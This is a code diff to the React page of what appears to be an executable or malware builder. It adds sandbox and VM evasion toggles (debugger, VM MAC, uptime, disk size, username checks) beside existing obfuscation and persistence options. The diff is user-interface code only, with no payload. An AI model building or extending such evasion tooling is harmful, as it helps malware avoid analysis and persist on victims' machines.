@@ -13,6 +13,11 @@ interface ToggleOption {
   key: keyof BuildConfigRequest;
 }
 
+interface AntiAnalysisToggle {
+  id: string;
+  key: keyof BuildConfigRequest['antiAnalysis'];
+}
+
 const DEFAULT_CONFIG: BuildConfigRequest = {
   platform: 'x64',
   applicationType: 'Console',
@@ -31,6 +36,17 @@ const DEFAULT_CONFIG: BuildConfigRequest = {
   requireAdmin: false,
   copyToAppData: false,
   enablePersistence: false,
+  antiAnalysis: {
+    enabled: false,
+    checkCpuCores: true,
+    checkMemory: true,
+    checkUptime: true,
+    checkDebugger: true,
+    checkParentProcess: true,
+    checkVmMac: true,
+    checkDiskSize: true,
+    checkUsername: true,
+  },
 };
 
 const STATUS_LABEL: Record<string, string> = {
@@ -99,6 +115,17 @@ export default function BuilderPage() {
     { id: 'enablePersistence', key: 'enablePersistence' },
   ], []);
 
+  const antiAnalysisOptions: AntiAnalysisToggle[] = useMemo(() => [
+    { id: 'checkCpuCores', key: 'checkCpuCores' },
+    { id: 'checkMemory', key: 'checkMemory' },
+    { id: 'checkUptime', key: 'checkUptime' },
+    { id: 'checkDebugger', key: 'checkDebugger' },
+    { id: 'checkParentProcess', key: 'checkParentProcess' },
+    { id: 'checkVmMac', key: 'checkVmMac' },
+    { id: 'checkDiskSize', key: 'checkDiskSize' },
+    { id: 'checkUsername', key: 'checkUsername' },
+  ], []);
+
   const selectedBuildKeys = useMemo(
     () => new Set(buildOptions.filter((o) => !!config[o.key]).map((o) => o.id)),
     [config.stripSymbols, config.enableObfuscation, config.injectJunkData],
@@ -107,6 +134,11 @@ export default function BuilderPage() {
   const selectedPersistenceKeys = useMemo(
     () => new Set(persistenceOptions.filter((o) => !!config[o.key]).map((o) => o.id)),
     [config.requireAdmin, config.copyToAppData, config.enablePersistence],
+  );
+
+  const selectedAntiAnalysisKeys = useMemo(
+    () => new Set(antiAnalysisOptions.filter((o) => !!config.antiAnalysis[o.key]).map((o) => o.id)),
+    [config.antiAnalysis],
   );
 
   const handleBuildSelectionChange = (keys: Selection) => {
@@ -121,6 +153,19 @@ export default function BuilderPage() {
     for (const opt of persistenceOptions) {
       set(opt.key, (s.has(opt.id) ? true : false) as BuildConfigRequest[typeof opt.key]);
     }
+  };
+
+  const handleAntiAnalysisSelectionChange = (keys: Selection) => {
+    const s = keys as Set<string>;
+    const updated = { ...config.antiAnalysis };
+    for (const opt of antiAnalysisOptions) {
+      updated[opt.key] = s.has(opt.id);
+    }
+    setConfig((c) => ({ ...c, antiAnalysis: updated }));
+  };
+
+  const toggleAntiAnalysis = () => {
+    setConfig((c) => ({ ...c, antiAnalysis: { ...c.antiAnalysis, enabled: !c.antiAnalysis.enabled } }));
   };
 
   const handleIconUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -420,8 +465,8 @@ export default function BuilderPage() {
           </div>
         </Card>
 
-        {/* Build options + Persistence side by side */}
-        <div className="grid grid-cols-2 gap-4">
+        {/* Build options + Persistence + Anti-Analysis */}
+        <div className="grid grid-cols-3 gap-4">
           <Card className="p-4">
             <h2 className="text-lg font-semibold mb-3">{t('builder.buildOptions')}</h2>
             <ListView
@@ -505,6 +550,50 @@ export default function BuilderPage() {
                 </ListView.Item>
               )}
             </ListView>
+          </Card>
+
+          <Card className="p-4">
+            <div className="flex items-center justify-between mb-3">
+              <h2 className="text-lg font-semibold">{t('builder.antiAnalysis')}</h2>
+              <button
+                type="button"
+                className={`relative inline-flex h-6 w-11 items-center rounded-full transition-colors ${config.antiAnalysis.enabled ? 'bg-primary' : 'bg-default-300'}`}
+                onClick={toggleAntiAnalysis}
+              >
+                <span className={`inline-block h-4 w-4 transform rounded-full bg-white transition-transform ${config.antiAnalysis.enabled ? 'translate-x-6' : 'translate-x-1'}`} />
+              </button>
+            </div>
+            {config.antiAnalysis.enabled && (
+              <ListView
+                aria-label={t('builder.antiAnalysis')}
+                items={antiAnalysisOptions}
+                selectedKeys={selectedAntiAnalysisKeys}
+                selectionMode="multiple"
+                variant="primary"
+                onSelectionChange={handleAntiAnalysisSelectionChange}
+              >
+                {(opt) => (
+                  <ListView.Item id={opt.id} textValue={t(`builder.${opt.id}`)}>
+                    <ListView.ItemContent>
+                      <div className="flex items-center justify-between w-full">
+                        <ListView.Title>{t(`builder.${opt.id}`)}</ListView.Title>
+                        <Popover>
+                          <Button isIconOnly variant="ghost" className="h-8 w-8 min-w-0">
+                            <CircleInfo className="h-6 w-6" />
+                          </Button>
+                          <Popover.Content className="max-w-64">
+                            <Popover.Dialog>
+                              <Popover.Heading className="text-sm">{t(`builder.${opt.id}`)}</Popover.Heading>
+                              <p className="mt-1 text-xs text-default-500">{t(`builder.${opt.id}Desc`)}</p>
+                            </Popover.Dialog>
+                          </Popover.Content>
+                        </Popover>
+                      </div>
+                    </ListView.ItemContent>
+                  </ListView.Item>
+                )}
+              </ListView>
+            )}
           </Card>
         </div>
 
